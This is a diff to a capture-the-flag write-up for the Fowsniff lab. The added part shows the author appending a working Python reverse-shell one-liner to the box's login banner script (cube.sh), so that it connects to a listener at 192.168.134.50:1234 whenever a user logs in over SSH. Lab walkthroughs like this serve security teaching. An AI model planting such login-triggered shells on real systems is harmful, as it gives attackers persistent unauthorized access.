@@ -806,6 +806,31 @@ sh /opt/cube/cube.sh
 This file calls motd (message of the day); banners, and announcements that you get upon login with information about the system or server. Usually a splash screen and announcement. 
 
 We can edit the `cube.sh` file to include a python reverse shell that will trigger once our user logs in via SSH - (make sure you add your local IP and listener port)
+
+```
+baksteen@fowsniff:~$ cd /opt/cube/
+baksteen@fowsniff:/opt/cube$ ls
+cube.sh
+baksteen@fowsniff:/opt/cube$ vi cube.sh 
+baksteen@fowsniff:/opt/cube$ vi cube.sh 
+baksteen@fowsniff:/opt/cube$ cat cube.sh 
+printf "
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions\n\n"
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.134.50",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 <div>
 <br>
 <br>
